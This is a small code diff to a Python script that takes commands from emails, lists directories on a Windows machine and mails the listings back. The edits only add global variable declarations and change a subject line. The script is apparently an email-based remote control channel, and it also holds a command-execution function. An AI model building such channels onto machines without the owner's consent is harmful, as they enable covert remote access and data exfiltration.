@@ -88,6 +88,7 @@ def sendEmail(msg):
 #EMAIL SUBJECT = show [Directory path] [id]
 #NEEDS TO START WITH "C:/" UNLESS KNOWN PATH
 def showFiles(commandString):
+    global lastCommand
     dirList = []
     fileList = []
     splitCommand = commandString.split(" ")
@@ -117,7 +118,7 @@ def showFiles(commandString):
             for file in fileList:
                 files_string += file + "\n"
 
-            subjectLine = "Subject: My Directory\n\n"
+            subjectLine = "Subject: My Directory " + str(id) + "\n\n"
             payload = subjectLine
             payload += lastCommand + ":\n\n" + "Files:\n" + files_string + "\nDirectories:\n" + directories_string
             sendEmail(payload)
@@ -168,6 +169,7 @@ def executeCom(commandString):
 
 #Parse commands from emails
 def commandParser(commandsParse):
+    global lastCommand
     while commandsParse:
         command = commandsParse[0]
         print(command)
